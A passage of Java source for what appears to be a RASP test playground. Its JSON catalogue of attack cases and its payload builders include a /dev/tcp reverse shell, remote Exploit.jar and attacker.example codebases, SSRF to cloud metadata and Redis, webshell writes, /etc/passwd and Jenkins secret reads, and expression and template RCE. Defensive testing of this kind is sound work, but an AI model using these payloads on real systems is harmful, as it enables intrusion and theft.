          {"category":"request","name":"Groovy script validation payload","path":"/rasp/policy/request-jenkins-groovy-checkscript"},
          {"category":"request","name":"Dynamic JSON script configuration","path":"/rasp/policy/request-dynamic-script-json-config"},
          {"category":"request","name":"Unomi context expression","path":"/rasp/policy/request-unomi-context-expression"},
          {"category":"request","name":"Metabase H2 init configuration","path":"/rasp/policy/request-metabase-h2-init-config"},
          {"category":"request","name":"H2 console JDBC INIT URL","path":"/rasp/policy/request-h2-console-jdbc-init"},
          {"category":"request","name":"H2 console JDBC INIT login","path":"/h2-console/login.do?driver=org.h2.Driver"},
          {"category":"request","name":"WebLogic console ShellSession handle","path":"/rasp/policy/request-weblogic-console-shellsession"},
          {"category":"request","name":"DataEase H2 datasource configuration","path":"/rasp/policy/request-dataease-h2-datasource-config"},
          {"category":"request","name":"Expression routing header","path":"/rasp/policy/request-expression-header"},
          {"category":"request","name":"Parser expression header","path":"/rasp/policy/request-expression-content-type"},
          {"category":"request","name":"JNDI lookup payload","path":"/rasp/policy/request-jndi-lookup"},
          {"category":"request","name":"H2 console JNDI driver URL","path":"/rasp/policy/request-h2-console-jndi-driver"},
          {"category":"request","name":"H2 console JNDI driver login","path":"/h2-console/login.do?driver=javax.naming.InitialContext&url=ldap%3A%2F%2F127.0.0.1%3A9%2FExploit"},
          {"category":"request","name":"Runtime expression parameter","path":"/rasp/policy/request-expression-parameter"},
          {"category":"request","name":"GeoServer WFS valueReference expression","path":"/rasp/policy/request-geoserver-wfs-valuereference"},
          {"category":"request","name":"GeoServer WFS XML valueReference expression","path":"/rasp/policy/request-geoserver-wfs-valuereference-xml"},
          {"category":"request","name":"GeoServer CQL filter SQL injection","path":"/rasp/policy/request-geoserver-cql-filter-sqli"},
          {"category":"request","name":"Delegated OGNL expression parameter","path":"/rasp/policy/request-confluence-delegated-expression"},
          {"category":"request","name":"Runtime JSON expression field","path":"/rasp/policy/request-expression-json-parameter"},
          {"category":"request","name":"Nexus REST group EL expression","path":"/rasp/policy/request-nexus-go-group-el-expression"},
          {"category":"request","name":"Nexus ExtDirect JEXL expression filter","path":"/rasp/policy/request-nexus-extdirect-jexl-expression"},
          {"category":"request","name":"OAuth response expression parameter","path":"/rasp/policy/request-oauth-expression-parameter"},
          {"category":"request","name":"JSON Patch path expression","path":"/rasp/policy/request-json-patch-expression"},
          {"category":"request","name":"Runtime expression parameter name","path":"/rasp/policy/request-expression-parameter-name"},
          {"category":"request","name":"Spring binding expression name","path":"/rasp/policy/request-spring-binding-expression-name"},
          {"category":"request","name":"Runtime expression path","path":"/rasp/policy/request-expression-path"},
          {"category":"request","name":"External XML entity payload","path":"/rasp/policy/request-xxe-payload"},
          {"category":"request","name":"Solr XML parser XXE payload","path":"/rasp/policy/request-solr-cve-2017-12629-xxe"},
          {"category":"request","name":"Typed Java binding parameter","path":"/rasp/policy/request-typed-parameter-deserialization"},
          {"category":"request","name":"Liferay JSONWS typed binding","path":"/api/jsonws/invoke"},
          {"category":"request","name":"Typed Java payload binding","path":"/rasp/policy/request-typed-payload-deserialization"},
          {"category":"request","name":"HertzBeat SnakeYAML import payload","path":"/rasp/policy/request-hertzbeat-cve-2024-42323-yaml-import"},
          {"category":"request","name":"XML polymorphic gadget payload","path":"/rasp/policy/request-xml-polymorphic-gadget"},
          {"category":"request","name":"XStream JNDI XML gadget payload","path":"/rasp/policy/request-xstream-jndi-xml-gadget"},
          {"category":"request","name":"XStream RMI XML gadget payload","path":"/rasp/policy/request-xstream-rmi-xml-gadget"},
          {"category":"request","name":"Flink log path traversal","path":"/rasp/policy/request-flink-log-path-traversal"},
          {"category":"request","name":"Runtime template parameter","path":"/rasp/policy/request-template-parameter"},
          {"category":"request","name":"Solr Velocity parameter template loader","path":"/rasp/policy/request-template-loader-enable"},
          {"category":"request","name":"Solr Velocity template parameter","path":"/rasp/policy/request-solr-cve-2019-17558-velocity-template"},
          {"category":"request","name":"Solr Velocity template loader enable","path":"/rasp/policy/request-solr-cve-2019-17558-template-loader-enable"},
          {"category":"request","name":"Jira contact Velocity template","path":"/rasp/policy/request-jira-contact-template"},
          {"category":"request","name":"Runtime JSON template parameter","path":"/rasp/policy/request-template-json-parameter"},
          {"category":"request","name":"JimuReport FreeMarker SQL template","path":"/jmreport/queryFieldBySql"},
          {"category":"request","name":"Unsafe template source path","path":"/rasp/policy/request-template-source"},
          {"category":"request","name":"Metadata classname source path","path":"/rasp/policy/request-coldfusion-metadata-class-source"},
          {"category":"request","name":"Locale source traversal","path":"/rasp/policy/request-locale-source-traversal"},
          {"category":"request","name":"Remote content streaming","path":"/rasp/policy/request-remote-content-stream"},
          {"category":"request","name":"Solr RemoteStreaming config enable","path":"/rasp/policy/request-solr-remotestreaming-config-enable"},
          {"category":"request","name":"Solr RemoteStreaming file read","path":"/rasp/policy/request-solr-remotestreaming-file-read"},
          {"category":"request","name":"Remote import to script target","path":"/rasp/policy/request-remote-import-script-write"},
          {"category":"request","name":"Repository persistence to webroot","path":"/rasp/policy/request-repository-webroot-write"},
          {"category":"request","name":"Plot command injection","path":"/rasp/policy/request-plot-command-injection"},
          {"category":"request","name":"OpenTSDB key plot command injection","path":"/rasp/policy/request-opentsdb-key-plot-command-injection"},
          {"category":"request","name":"JSON sort SQL injection","path":"/rasp/policy/request-sql-sort-injection"},
          {"category":"request","name":"GraphQL SQL identifier injection","path":"/rasp/policy/request-skywalking-graphql-sql-identifier"},
          {"category":"request","name":"Remote job submission","path":"/rasp/policy/remote-job-submission"},
          {"category":"request","name":"Hadoop YARN command submission","path":"/rasp/policy/remote-hadoop-yarn-command-submission"},
          {"category":"request","name":"Internal forward to control path","path":"/rasp/policy/request-internal-forward"},
          {"category":"request","name":"Path normalization confusion","path":"/rasp/policy/request-path-confusion"},
          {"category":"request","name":"DataEase geo whitelist traversal","path":"/geo/../dataease/de2api/datasource/types"},
          {"category":"request","name":"Dot-segment auth path confusion","path":"/rasp/policy/request-path-confusion?uri=/./admin"},
          {"category":"request","name":"Nexus encoded slash path traversal","path":"/rasp/policy/request-path-confusion?uri=/%252F%252F%252F%252F%252F%252F%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd"},
          {"category":"request","name":"Elasticsearch MVEL search script","path":"/rasp/policy/request-elasticsearch-cve-2014-3120-search-script"},
          {"category":"request","name":"Elasticsearch Groovy search script","path":"/rasp/policy/request-elasticsearch-cve-2015-1427-search-script"},
          {"category":"request","name":"Elasticsearch plugin path traversal","path":"/rasp/policy/request-path-confusion?uri=/_plugin/head/../../../../../../../../../etc/passwd"},
          {"category":"request","name":"Elasticsearch snapshot path traversal","path":"/rasp/policy/request-path-confusion?uri=/_snapshot/test/backdata%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"},
          {"category":"request","name":"Decoded internal web resource","path":"/rasp/policy/request-internal-resource"},
          {"category":"request","name":"Forged servlet include attribute","path":"/rasp/policy/request-forged-include-attribute"},
          {"category":"request","name":"Tomcat Ghostcat AJP include attributes","path":"/rasp/policy/request-tomcat-cve-2020-1938-ajp-include"},
          {"category":"request","name":"Control-character path confusion","path":"/rasp/policy/request-path-confusion?uri=/admin/%250atest"},
          {"category":"request","name":"Jetty lenient hex path confusion","path":"/rasp/policy/request-path-confusion?uri=/setup/setup-s/%252%3E%252%3E/%252%3E%252%3E/user-create.jsp"},
          {"category":"request","name":"Overlong UTF-8 path confusion","path":"/rasp/policy/request-path-confusion?uri=/theme/META-INF/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/etc/passwd"},
          {"category":"request","name":"Spring Jetty ghost-bits path confusion","path":"/rasp/policy/request-spring-jetty-ghostbits-path-confusion"},
          {"category":"request","name":"Spring CVE-2025-41242 ghost-bits traversal","path":"/rasp/policy/request-spring-cve-2025-41242-ghostbits-path-traversal"},

          {"category":"command","name":"Command user input","path":"/rasp/command?cmd=sh&arg=-c&arg=cat%20/etc/passwd%3B%20id"},
          {"category":"command","name":"Command common payload","path":"/rasp/command/common"},
          {"category":"command","name":"Command syntax error","path":"/rasp/command/error"},
          {"category":"command","name":"Command DNS callback payload","path":"/rasp/command/dnslog"},
          {"category":"command","name":"Reflective command execution","path":"/rasp/command/reflect"},
          {"category":"command","name":"Configured executable listener","path":"/rasp/policy/command-config-listener"},
          {"category":"command","name":"Solr RunExecutableListener command","path":"/rasp/policy/command-solr-cve-2017-12629-runexecutable"},
          {"category":"command","name":"Config-injected command launcher","path":"/rasp/policy/command-config-injection"},
          {"category":"command","name":"RocketMQ filter server command launcher","path":"/rasp/policy/command-rocketmq-cve-2023-33246-filterserver"},

          {"category":"file","name":"Sensitive file read","path":"/rasp/file/read?path=/etc/passwd"},
          {"category":"file","name":"Hardcoded sensitive file read","path":"/rasp/file/read-sensitive"},
          {"category":"file","name":"Read outside application","path":"/rasp/file/read-outside"},
          {"category":"file","name":"Script file write","path":"/rasp/file/write?path=/usr/local/tomcat/webapps/ROOT/shell.jsp"},
          {"category":"file","name":"Reflective script file write","path":"/rasp/file/write-reflect"},
          {"category":"file","name":"Config path file write","path":"/rasp/policy/write-config-path"},
          {"category":"file","name":"RocketMQ NameServer config path write","path":"/rasp/policy/write-rocketmq-cve-2023-37582-config-path"},
          {"category":"file","name":"Generated interpreter script write","path":"/rasp/policy/write-generated-script?payload=%5B0%3Asystem%28%27touch%20%2Ftmp%2Fsuccess%27%29%5D"},
          {"category":"file","name":"OpenTSDB generated key script write","path":"/rasp/policy/write-generated-script-key"},
          {"category":"file","name":"File delete","path":"/rasp/file/delete?path=/tmp/ohmyrasp-delete-target.txt"},

          {"category":"directory","name":"Directory listing","path":"/rasp/directory?path=/etc"},
          {"category":"directory","name":"Root directory listing","path":"/rasp/directory/root"},
          {"category":"directory","name":"Reflective directory listing policy","path":"/rasp/policy/directory-reflect"},

          {"category":"network","name":"SSRF metadata","path":"/rasp/ssrf?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"},
          {"category":"network","name":"DNS callback","path":"/rasp/dns?host=probe.dnslog.cn"},
          {"category":"network","name":"SSRF user input policy","path":"/rasp/policy/ssrf-userinput?url=http%3A%2F%2F127.0.0.1%2Fadmin"},
          {"category":"network","name":"GeoServer TestWfsPost SSRF relay","path":"/rasp/policy/ssrf-geoserver-testwfspost?url=http%3A%2F%2Finteral%2Fgeoserver%2F..%2F&body=testtest&username=admin&password=admin"},
          {"category":"network","name":"WebLogic UDDI Explorer SSRF relay","path":"/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2F172.19.0.2%3A6379%2Ftest%250D%250A%250D%250Aconfig%2520set%2520dir%2520%2Fetc%2F%250D%250Asave"},
          {"category":"network","name":"SSRF common callback policy","path":"/rasp/policy/ssrf-common"},
          {"category":"network","name":"SSRF protocol policy","path":"/rasp/policy/ssrf-protocol"},
          {"category":"network","name":"SSRF obfuscated localhost policy","path":"/rasp/policy/ssrf-obfuscate"},
          {"category":"java","name":"Remote classloader codebase","path":"/rasp/classloader/url?codebase=http%3A%2F%2Fattacker.example%2Fevil.jar"},
          {"category":"java","name":"RMIClassLoader remote codebase","path":"/rasp/classloader/rmi-codebase?codebase=http%3A%2F%2Fattacker.example%2FExploit"},
          {"category":"java","name":"Remote Spring XML config","path":"/rasp/spring/config?config=http%3A%2F%2F127.0.0.1%3A9%2Fpoc.xml"},
          {"category":"java","name":"JMX remote config invocation","path":"/rasp/jmx/invoke"},
          {"category":"java","name":"ActiveMQ Jolokia brokerConfig invocation","path":"/api/jolokia/"},
          {"category":"java","name":"JMX script file write invocation","path":"/rasp/jmx/write"},

          {"category":"jndi","name":"JNDI LDAP lookup","path":"/rasp/jndi?name=ldap%3A%2F%2F127.0.0.1%3A1389%2Fa"},
          {"category":"jndi","name":"JAAS JNDI login config","path":"/rasp/jaas/config?provider=ldap%3A%2F%2Fjava-chains%3A50389%2Fx"},

          {"category":"sql","name":"SQL injection","path":"/rasp/sql?value=%27%20OR%20%271%27%3D%271"},
          {"category":"sql","name":"SQL exception policy","path":"/rasp/policy/sql-exception"},
          {"category":"sql","name":"SQL policy rule","path":"/rasp/policy/sql-policy"},
          {"category":"sql","name":"SQL regex policy","path":"/rasp/policy/sql-regex"},
          {"category":"sql","name":"H2 executable alias","path":"/rasp/h2/sql"},
          {"category":"sql","name":"H2 console executable query","path":"/h2-console/query.do"},
          {"category":"sql","name":"H2 JDBC INIT execution","path":"/rasp/h2/jdbc-init"},
          {"category":"sql","name":"Derby Java routine code loading","path":"/rasp/policy/sql-derby-code"},
          {"category":"sql","name":"Nacos Derby ops Java code loading","path":"/nacos/v1/cs/ops/derby"},
          {"category":"sql","name":"MySQL rogue JDBC deserialization","path":"/rasp/jdbc/mysql"},
          {"category":"sql","name":"Linkis MySQL datasource connect","path":"/api/rest_j/v1/data-source-manager/op/connect/json"},

          {"category":"java","name":"Deserialization","path":"/rasp/deserialize"},
          {"category":"java","name":"Deserialization gadget family","path":"/rasp/policy/deserialization-gadget"},
          {"category":"java","name":"Cluster message deserialization","path":"/rasp/policy/deserialization-cluster-message"},
          {"category":"java","name":"Logging socket deserialization","path":"/rasp/policy/deserialization-logging-message"},
          {"category":"java","name":"WebFlow client state deserialization","path":"/rasp/policy/deserialization-webflow-state"},
          {"category":"java","name":"CAS WebFlow execution state","path":"/cas/login"},
          {"category":"java","name":"RMI transport deserialization","path":"/rasp/policy/deserialization-rmi-transport"},
          {"category":"java","name":"Neo4j Shell setSessionVariable deserialization","path":"/neo4j-shell/setSessionVariable?gadget=org.mozilla.javascript.NativeJavaObject"},
          {"category":"java","name":"Remoting transport deserialization","path":"/rasp/policy/deserialization-remoting-transport"},
          {"category":"java","name":"WebLogic T3 JRMPClient deserialization","path":"/rasp/policy/deserialization-weblogic-cve-2018-2628-t3-jrmpclient"},
          {"category":"java","name":"WebLogic IIOP JNDI deserialization","path":"/rasp/policy/deserialization-weblogic-cve-2023-21839-iiop-jndi"},
          {"category":"java","name":"JMS ObjectMessage deserialization","path":"/rasp/policy/deserialization-jms-object-message"},
          {"category":"java","name":"SignedObject CLI deserialization","path":"/rasp/policy/deserialization-signed-object"},
          {"category":"java","name":"File-backed session deserialization","path":"/rasp/policy/deserialization-session-file?id=.deserialize"},
          {"category":"java","name":"Protocol class instantiation","path":"/rasp/policy/deserialization-protocol-class?xml=http%3A%2F%2Fattacker.example%2Fpoc.xml"},
          {"category":"java","name":"Spring HTTP Invoker deserialization","path":"/rasp/policy/deserialization-http-invoker"},
          {"category":"java","name":"HTTP ObjectInputStream body","path":"/rasp/policy/deserialization-http-object-stream"},
          {"category":"java","name":"JBoss ReadOnlyAccessFilter deserialization","path":"/invoker/readonly"},
          {"category":"java","name":"JBoss JMXInvokerServlet deserialization","path":"/invoker/JMXInvokerServlet"},
          {"category":"java","name":"JBossMQ HTTPIL deserialization","path":"/jbossmq-httpil/HTTPServerILServlet"},
          {"category":"java","name":"Hessian dangerous type resolution","path":"/rasp/policy/deserialization-hessian-type"},
          {"category":"java","name":"XML-RPC serialized value","path":"/rasp/policy/deserialization-xmlrpc-serialized"},
          {"category":"java","name":"RMI Registry remote bind","path":"/rasp/policy/deserialization-rmi-registry-bind"},
          {"category":"java","name":"RMI Registry UnicastRef bind bypass","path":"/rasp/policy/deserialization-rmi-registry-bind-bypass"},
          {"category":"java","name":"ColdFusion AMF deserialization","path":"/flex2gateway/amf"},
          {"category":"java","name":"Polymorphic deserialization type","path":"/rasp/deserialize/polymorphic?parser=fastjson&type=com.sun.rowset.JdbcRowSetImpl"},
          {"category":"java","name":"Fastjson autoType JdbcRowSetImpl","path":"/fastjson"},
          {"category":"java","name":"Jackson wrapper-array TemplatesImpl","path":"/exploit"},
          {"category":"java","name":"SnakeYAML H2 JDBC constructor","path":"/rasp/deserialize/polymorphic?parser=snakeyaml&type=org.h2.jdbc.JdbcConnection"},
          {"category":"java","name":"XMLDecoder runtime object graph","path":"/rasp/xml/decoder"},
          {"category":"java","name":"XMLDecoder script writer object graph","path":"/rasp/xml/decoder-webshell"},
          {"category":"java","name":"WebLogic WorkContext XMLDecoder object graph","path":"/wls-wsat/CoordinatorPortType"},

          {"category":"xml","name":"XXE file entity","path":"/rasp/xxe?entity=file%3A%2F%2F%2Fetc%2Fpasswd"},
          {"category":"xml","name":"XXE protocol policy","path":"/rasp/policy/xxe-protocol"},
          {"category":"xml","name":"XXE file detector","path":"/rasp/policy/xxe-file"},
          {"category":"xml","name":"XOP attachment file reference","path":"/rasp/policy/xml-attachment?href=file%3A%2F%2F%2Fetc%2Fhosts"},

          {"category":"read","name":"Remote file read policy","path":"/rasp/policy/read-http?file=http%3A%2F%2F127.0.0.1%2Finternal"},
          {"category":"read","name":"Unwanted file read policy","path":"/rasp/policy/read-unwanted?file=file%3A%2F%2F%2Fetc%2Fpasswd"},
          {"category":"read","name":"Jenkins CLI args4j @file expansion","path":"/rasp/policy/argument-file-expansion?arg=help&arg=1&arg=%40/proc/self/environ"},

          {"category":"include","name":"Include user input policy","path":"/rasp/policy/include-userinput?file=/etc/passwd"},
          {"category":"include","name":"Include protocol policy","path":"/rasp/policy/include-protocol"},

          {"category":"upload","name":"Multipart script upload","path":"/rasp/policy/upload-script"},
          {"category":"upload","name":"Multipart expression filename","path":"/rasp/policy/upload-expression-filename"},
          {"category":"upload","name":"Multipart filename traversal","path":"/rasp/policy/upload-traversal"},
          {"category":"upload","name":"Multipart HTML upload","path":"/rasp/policy/upload-html"},
          {"category":"upload","name":"Executable upload","path":"/rasp/policy/upload-exe"},
          {"category":"upload","name":"Java plugin archive upload","path":"/rasp/policy/plugin-upload"},
          {"category":"upload","name":"WebLogic WS Test Page JSP upload","path":"/ws_utc/resources/setting/keystore?filename=shell.jsp"},
          {"category":"upload","name":"WebDAV upload rename","path":"/rasp/policy/webdav"},
          {"category":"upload","name":"WebDAV unsafe file destination","path":"/rasp/policy/webdav-unsafe-destination"},
          {"category":"upload","name":"Dangerous rename","path":"/rasp/policy/rename"},
          {"category":"upload","name":"Dangerous hard link","path":"/rasp/policy/link"},

          {"category":"archive","name":"Zip Slip extraction","path":"/rasp/archive?entry=../escaped/archive.txt"},
          {"category":"archive","name":"kkFileView ZipSlip preview","path":"/onlinePreview?url=aHR0cDovL2F0dGFja2VyLmV4YW1wbGUvdGVzdC56aXA="},

          {"category":"expression","name":"OGNL blacklist","path":"/rasp/policy/ognl"},
          {"category":"expression","name":"OGNL length limit","path":"/rasp/policy/ognl-length"},
          {"category":"expression","name":"Spring SpEL runtime execution","path":"/rasp/spel?expr=T(java.lang.Runtime).getRuntime().exec('id')"},
          {"category":"expression","name":"Commons JEXL runtime execution","path":"/rasp/policy/jexl-runtime"},
          {"category":"expression","name":"Unified EL runtime execution","path":"/rasp/policy/el-runtime"},
          {"category":"expression","name":"Embedded JavaScript runtime execution","path":"/rasp/policy/javascript-runtime"},
          {"category":"expression","name":"Jiffle map algebra runtime execution","path":"/rasp/policy/jiffle-runtime"},
          {"category":"expression","name":"GeoServer WMS Jiffle WPS execution","path":"/geoserver/wms"},
          {"category":"expression","name":"JSR-223 script runtime execution","path":"/rasp/script/jsr223?script=java.lang.Runtime.getRuntime().exec('id')"},
          {"category":"expression","name":"Script command stack execution","path":"/rasp/policy/script-command-stack"},
          {"category":"expression","name":"XPath runtime execution","path":"/rasp/xpath?expr=exec(java.lang.Runtime.getRuntime(),'touch%20/tmp/success')"},
          {"category":"expression","name":"Commons JXPath runtime execution","path":"/rasp/jxpath?expr=exec(java.lang.Runtime.getRuntime(),'touch%20/tmp/success')"},
          {"category":"expression","name":"Dynamic Java compile runtime execution","path":"/rasp/java/compile"},
          {"category":"expression","name":"Velocity template runtime execution","path":"/rasp/template/velocity"},
          {"category":"expression","name":"Dynamic eval policy","path":"/rasp/policy/eval"},

          {"category":"native","name":"Native library load policy","path":"/rasp/policy/loadlib"},

          {"category":"response","name":"Response PII leak","path":"/rasp/policy/response"},
          {"category":"response","name":"Reflected XSS response","path":"/rasp/policy/xss-echo?q=%3Cscript%3Ealert(1)%3C/script%3E"},

          {"category":"webshell","name":"Webshell eval","path":"/rasp/policy/webshell-eval?code=system('id')"},
          {"category":"webshell","name":"Webshell command","path":"/rasp/policy/webshell-command?cmd=sh%20-c%20id"},
          {"category":"webshell","name":"Webshell file write","path":"/rasp/policy/webshell-file?file=shell.jsp&content=%3C%25%20out.println(1)%3B%20%25%3E"},
          {"category":"webshell","name":"Webshell callable","path":"/rasp/policy/webshell-callable"},
          {"category":"webshell","name":"Webshell LD_PRELOAD","path":"/rasp/policy/webshell-ld"}
        ]
        """;
  }

  private static String environmentsJson() {
    return """
        [
          {"id":"tomcat9-baseline","label":"Tomcat 9 baseline","kind":"baseline","port":18080},
          {"id":"tomcat9-protected","label":"Tomcat 9 protected","kind":"protected","port":18081},
          {"id":"tomcat10-baseline","label":"Tomcat 10 baseline","kind":"baseline","port":18082},
          {"id":"tomcat10-protected","label":"Tomcat 10 protected","kind":"protected","port":18083},
          {"id":"tomcat11-baseline","label":"Tomcat 11 baseline","kind":"baseline","port":18084},
          {"id":"tomcat11-protected","label":"Tomcat 11 protected","kind":"protected","port":18085}
        ]
        """;
  }

  private static String html(String value) {
    return value == null
        ? ""
        : value
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace("\"", "&quot;")
            .replace("'", "&#39;");
  }

  private static String value(HttpServletRequest request, String name, String fallback) {
    String value = request.getParameter(name);
    return value == null ? fallback : value;
  }

  private static String escapeJson(String value) {
    return value.replace("\\", "\\\\").replace("\"", "\\\"");
  }

  private static String[] argumentFileExpansionArguments(HttpServletRequest request) {
    String[] args = request.getParameterValues("arg");
    return args == null || args.length == 0
        ? new String[] {"help", "1", "@/var/jenkins_home/secrets/master.key"}
        : args;
  }

  private static String firstLine(String value) {
    if (value == null || value.isBlank()) {
      return "";
    }
    int newline = value.indexOf('\n');
    String first = newline >= 0 ? value.substring(0, newline) : value;
    return first.length() > 120 ? first.substring(0, 120) : first;
  }

  private static final class StringJavaSource extends SimpleJavaFileObject {
    private final String source;

    private StringJavaSource(String className, String source) {
      super(
          URI.create(
              "string:///" + className.replace('.', '/') + JavaFileObject.Kind.SOURCE.extension),
          JavaFileObject.Kind.SOURCE);
      this.source = source;
    }

    @Override
    public CharSequence getCharContent(boolean ignoreEncodingErrors) {
      return source;
    }
  }

  public interface PlaygroundBrokerMBean {
    String addNetworkConnector(String uri);

    String copyTo(String path);

    String copyTo(String recordingId, String path);

    String setConfigText(String configText, String encoding);
  }

  public static final class PlaygroundBroker implements PlaygroundBrokerMBean {
    @Override
    public String addNetworkConnector(String uri) {
      return uri;
    }

    @Override
    public String copyTo(String path) {
      return path;
    }

    @Override
    public String copyTo(String recordingId, String path) {
      return path;
    }

    @Override
    public String setConfigText(String configText, String encoding) {
      return configText;
    }
  }

  public static final class PlaygroundScriptEngineImpl extends AbstractScriptEngine {
    @Override
    public Object eval(String script, ScriptContext context) {
      return script;
    }

    @Override
    public Object eval(java.io.Reader reader, ScriptContext context) throws ScriptException {
      throw new ScriptException("reader scripts are not used by the playground");
    }

    @Override
    public Bindings createBindings() {
      return new SimpleBindings();
    }

    @Override
    public ScriptEngineFactory getFactory() {
      return null;
    }
  }

  private static String remoteJobDescriptor() {
    return """
        {
          "action": "CreateSubmissionRequest",
          "appResource": "https://example.com/jobs/Exploit.jar",
          "mainClass": "Exploit",
          "sparkProperties": {
            "spark.jars": "https://example.com/jobs/Exploit.jar"
          }
        }
        """;
  }

  private static String hadoopYarnJobDescriptor() {
    return """
        {
          "application-id": "application_1670000000000_0001",
          "application-name": "get-shell",
          "am-container-spec": {
            "commands": {
              "command": "/bin/bash -i >& /dev/tcp/192.0.2.1/9999 0>&1"
            }
          },
          "application-type": "YARN"
        }
        """;
  }

  private static String kafkaJndiLoginModuleConfig() {
    return "com.sun.security.auth.module.JndiLoginModule required "
        + "user.provider.url=\"ldap://java-chains:50389/x\" "
        + "useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";";
  }

  private static String druidKafkaSamplerBody(String config) {
    return """
        {
          "type": "kafka",
          "spec": {
            "type": "kafka",
            "ioConfig": {
              "type": "kafka",
              "consumerProperties": {
                "bootstrap.servers": "127.0.0.1:6666",
                "sasl.mechanism": "SCRAM-SHA-256",
                "security.protocol": "SASL_SSL",
                "sasl.jaas.config": "%s"
              },
              "topic": "test",
              "useEarliestOffset": true
            }
          }
        }
        """
        .formatted(jsonString(config));
  }

  private static String linkisDatasourceConnectBody() {
    return """
        {
          "dataSourceName": "evil",
          "dataSourceTypeId": 1,
          "createSystem": "Linkis",
          "connectParams": {
            "host": "attacker.example",
            "port": "3308",
            "username": "dd14fff",
            "password": "x",
            "params": "%s"
          }
        }
        """
        .formatted(jsonString(linkisDatasourceParams()));
  }

  private static String metabaseSetupValidateBody() {
    String init =
        "CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n"
            + "java.lang.Runtime.getRuntime().exec('touch /tmp/success')\n$$";
    String escapedInit = jsonString(init).replace("\n", "\\n");
    return "{\"token\":\"setup-token\",\"details\":{\"details\":{\"db\":\"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;\",\"init\":\""
        + escapedInit
        + "\"},\"engine\":\"h2\"}}";
  }

  private static String ajReportValidationRulesBody() {
    String script =
        "function verification(data){a = new java.lang.ProcessBuilder(\"id\")"
            + ".start().getInputStream();return a;}";
    return "{\"ParamName\":\"\",\"sampleItem\":\"1\",\"validationRules\":\""
        + jsonString(script)
        + "\"}";
  }

  private static String skyWalkingGraphqlSqlIdentifierBody() {
    return "{\"query\":\"query queryLogs($condition: LogQueryCondition) {"
        + " queryLogs(condition: $condition) { total logs { serviceId serviceName isError content } }"
        + " }\","
        + "\"variables\":{\"condition\":{\"metricName\":\"sqli where 1=1 --\","
        + "\"state\":\"ALL\",\"paging\":{\"pageSize\":10}}}}";
  }

  private static String hugeGraphGremlinBody() {
    return "{\"gremlin\":\""
        + jsonString(hugeGraphGremlinScript())
        + "\",\"bindings\":{},\"language\":\"gremlin-groovy\",\"aliases\":{}}";
  }

  private static String hugeGraphGremlinScript() {
    return "Thread thread = Thread.currentThread();"
        + "Class clz = Class.forName(\"java.lang.Thread\");"
        + "java.lang.reflect.Field field = clz.getDeclaredField(\"name\");"
        + "field.setAccessible(true);"
        + "field.set(thread, \"SL7\");"
        + "Class processBuilderClass = Class.forName(\"java.lang.ProcessBuilder\");"
        + "java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);"
        + "java.util.List command = java.util.Arrays.asList(\"id\");"
        + "Object processBuilderInstance = constructor.newInstance(command);"
        + "java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\"start\");"
        + "org.apache.commons.io.IOUtils.toString(startMethod.invoke(processBuilderInstance).getInputStream());";
  }

  private static String jiraContactVelocityTemplate() {
    return "$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null)"
        + ".invoke(null, null).exec('whoami').toString()";
  }

  private static Remote remoteProxy() {
    return (Remote)
        Proxy.newProxyInstance(
            VulnerableServlet.class.getClassLoader(),
            new Class<?>[] {Remote.class},
            (proxy, method, args) -> null);
  }

  private static String jsonString(String value) {
    return value.replace("\\", "\\\\").replace("\"", "\\\"");
  }

  private static String valueOrDefault(String value, String fallback) {
    return value == null || value.isBlank() ? fallback : value;
  }

  private static String jsonStringField(String json, String field, String fallback) {
    Matcher matcher =
        Pattern.compile("\"" + Pattern.quote(field) + "\"\\s*:\\s*\"((?:\\\\.|[^\"\\\\])*)\"")
            .matcher(json == null ? "" : json);
    return matcher.find() ? decodeJsonString(matcher.group(1)) : fallback;
  }

  private static List<String> jsonStringFieldValues(String json, String field) {
    Matcher matcher =
        Pattern.compile("\"" + Pattern.quote(field) + "\"\\s*:\\s*\"((?:\\\\.|[^\"\\\\])*)\"")
            .matcher(json == null ? "" : json);
    List<String> values = new ArrayList<>();
    while (matcher.find()) {
      values.add(decodeJsonString(matcher.group(1)));
    }
    return values;
  }

  private static List<String> jsonStringArrayValues(String json, String field) {
    Matcher matcher =
        Pattern.compile(
                "\"" + Pattern.quote(field) + "\"\\s*:\\s*\\[(.*?)]", Pattern.DOTALL)
            .matcher(json == null ? "" : json);
    if (!matcher.find()) {
      return List.of();
    }
    Matcher itemMatcher = Pattern.compile("\"((?:\\\\.|[^\"\\\\])*)\"").matcher(matcher.group(1));
    List<String> items = new ArrayList<>();
    while (itemMatcher.find()) {
      items.add(decodeJsonString(itemMatcher.group(1)));
    }
    return items;
  }

  private static String jolokiaOperationName(String operation) {
    int signatureStart = operation.indexOf('(');
    return signatureStart > 0 ? operation.substring(0, signatureStart) : operation;
  }

  private static String[] jmxStringSignatures(int size) {
    String[] signatures = new String[size];
    for (int i = 0; i < size; i++) {
      signatures[i] = String.class.getName();
    }
    return signatures;
  }

  private static String decodeJsonString(String value) {
    StringBuilder decoded = new StringBuilder(value.length());
    for (int index = 0; index < value.length(); index++) {
      char current = value.charAt(index);
      if (current != '\\' || index + 1 >= value.length()) {
        decoded.append(current);
        continue;
      }
      char escaped = value.charAt(++index);
      switch (escaped) {
        case 'b' -> decoded.append('\b');
        case 'f' -> decoded.append('\f');
        case 'n' -> decoded.append('\n');
        case 'r' -> decoded.append('\r');
        case 't' -> decoded.append('\t');
        case 'u' -> {
          if (index + 4 < value.length()) {
            String hex = value.substring(index + 1, index + 5);
            try {
              decoded.append((char) Integer.parseInt(hex, 16));
              index += 4;
            } catch (NumberFormatException ignored) {
              decoded.append("\\u").append(hex);
              index += 4;
            }
          } else {
            decoded.append("\\u");
          }
        }
        default -> decoded.append(escaped);
      }
    }
